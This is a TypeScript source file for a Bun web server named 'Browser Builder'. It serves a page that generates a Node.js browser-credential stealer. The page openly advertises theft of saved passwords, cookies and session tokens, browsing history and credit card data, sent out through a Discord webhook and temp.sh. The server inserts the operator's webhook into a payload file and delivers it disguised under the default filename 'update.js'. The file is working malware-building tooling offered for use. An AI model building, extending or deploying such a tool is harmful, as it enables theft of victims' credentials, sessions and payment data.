import { readFileSync } from "fs";
import { join, dirname } from "path";
import { fileURLToPath } from "url";

const PORT    = parseInt(process.env.BROWSER_BUILDER_PORT || "5176");
const HOST    = process.env.HOST || "0.0.0.0";
const PAYLOAD = readFileSync(join(dirname(fileURLToPath(import.meta.url)), "payload.js"), "utf8");

function buildPayload(webhookUrl: string): string {
  return PAYLOAD.replace(/__WEBHOOK_URL__/g, webhookUrl.replace(/\\/g, "\\\\").replace(/'/g, "\\'"));
}

const UI_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Browser Builder</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#09090b;color:#e4e4e7;font-family:'Segoe UI',system-ui,sans-serif;
  min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:2rem}
.card{background:#111113;border:1px solid #27272a;border-radius:14px;
  padding:2.5rem 2rem;width:100%;max-width:520px;box-shadow:0 25px 50px rgba(0,0,0,.5)}
h1{font-size:1.3rem;font-weight:700;color:#a78bfa;display:flex;align-items:center;gap:.5rem;margin-bottom:.4rem}
.sub{font-size:.82rem;color:#71717a;margin-bottom:2rem}
label{display:block;font-size:.78rem;font-weight:500;color:#a1a1aa;margin-bottom:.4rem;
  text-transform:uppercase;letter-spacing:.04em}
input{width:100%;background:#09090b;border:1px solid #27272a;border-radius:8px;
  padding:.65rem .9rem;color:#e4e4e7;font-size:.875rem;outline:none;margin-bottom:1.25rem;transition:.15s border-color}
input:focus{border-color:#7c3aed}
.features{display:grid;grid-template-columns:1fr 1fr;gap:.5rem;margin:1.5rem 0 .75rem}
.feat{background:#18181b;border:1px solid #27272a;border-radius:8px;
  padding:.6rem .8rem;font-size:.78rem;color:#a1a1aa;display:flex;align-items:center;gap:.4rem}
.feat b{color:#e4e4e7}
button[type=submit]{width:100%;background:linear-gradient(135deg,#7c3aed,#6d28d9);
  border:none;border-radius:8px;padding:.75rem;color:#fff;font-size:.9rem;font-weight:700;
  cursor:pointer;letter-spacing:.02em;transition:.15s;margin-top:.25rem}
button[type=submit]:hover{background:linear-gradient(135deg,#8b5cf6,#7c3aed);
  transform:translateY(-1px);box-shadow:0 8px 25px rgba(124,58,237,.35)}
button[type=submit]:active{transform:none}
button[type=submit]:disabled{opacity:.5;cursor:default;transform:none;box-shadow:none}
.err{color:#f87171;font-size:.8rem;margin-top:.75rem;text-align:center;display:none}
</style>
</head>
<body>
<div class="card">
  <h1>&#x1F577; Browser Builder</h1>
  <p class="sub">Generates a Node.js browser harvester. Discord C2 + temp.sh exfil.</p>

  <div class="features">
    <div class="feat">&#x1F511; <b>Passwords</b> Chrome / Edge / FF</div>
    <div class="feat">&#x1F36A; <b>Cookies</b> Session tokens</div>
    <div class="feat">&#x1F4DC; <b>History</b> Top visited URLs</div>
    <div class="feat">&#x1F4B3; <b>Cards</b> Autofill &amp; CC</div>
    <div class="feat">&#x1F4E4; <b>temp.sh</b> File exfil links</div>
    <div class="feat">&#x1F49C; <b>Discord</b> Rich embeds</div>
  </div>

  <form id="f">
    <label>Discord Webhook URL</label>
    <input type="url" id="webhook" placeholder="https://discord.com/api/webhooks/..." required>
    <label>Output Filename</label>
    <input type="text" id="fname" value="update.js" placeholder="update.js" required>
    <button type="submit" id="btn">&#x2B07; Generate &amp; Download</button>
    <div class="err" id="err"></div>
  </form>
</div>
<script>
document.getElementById('f').onsubmit = async function(e) {
  e.preventDefault();
  var err = document.getElementById('err');
  var btn = document.getElementById('btn');
  err.style.display = 'none';
  btn.disabled = true;
  btn.textContent = 'Building\u2026';
  try {
    var res = await fetch('/api/build', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        webhook:  document.getElementById('webhook').value,
        filename: document.getElementById('fname').value || 'update.js',
      })
    });
    if (!res.ok) {
      var d = await res.json().catch(function() { return {}; });
      err.textContent = d.error || 'Build failed';
      err.style.display = 'block';
      return;
    }
    var blob = await res.blob();
    var url  = URL.createObjectURL(blob);
    var a    = document.createElement('a');
    a.href = url;
    a.download = document.getElementById('fname').value || 'update.js';
    a.click();
    URL.revokeObjectURL(url);
  } catch(ex) {
    err.textContent = ex.message;
    err.style.display = 'block';
  } finally {
    btn.disabled = false;
    btn.textContent = '&#x2B07; Generate & Download';
  }
};
</script>
</body>
</html>`;

const server = Bun.serve({
  port: PORT,
  hostname: HOST,
  async fetch(req) {
    const url = new URL(req.url);

    if (url.pathname === "/health") return Response.json({ ok: true });
    if (url.pathname === "/" || url.pathname === "") {
      return new Response(UI_HTML, { headers: { "Content-Type": "text/html; charset=utf-8" } });
    }

    if (url.pathname === "/api/build" && req.method === "POST") {
      let body: any;
      try { body = await req.json(); } catch {
        return Response.json({ error: "Invalid JSON" }, { status: 400 });
      }

      const webhook: string = (body?.webhook || "").trim();
      if (!webhook.startsWith("https://discord.com/api/webhooks/")) {
        return Response.json({ error: "Must be a valid Discord webhook URL" }, { status: 400 });
      }

      const filename: string = (body?.filename || "update.js")
        .replace(/[^\w\-. ]/g, "_").slice(0, 64) || "update.js";

      const payload = buildPayload(webhook);
      return new Response(payload, {
        headers: {
          "Content-Type": "application/javascript; charset=utf-8",
          "Content-Disposition": `attachment; filename="${filename}"`,
          "Content-Length": String(Buffer.byteLength(payload, "utf8")),
        },
      });
    }

    return new Response("Not found", { status: 404 });
  },
  error(err) {
    console.error("[browser-builder]", err);
    return Response.json({ error: "Internal error" }, { status: 500 });
  },
});

console.log(`[browser-builder] http://${HOST}:${PORT}`);
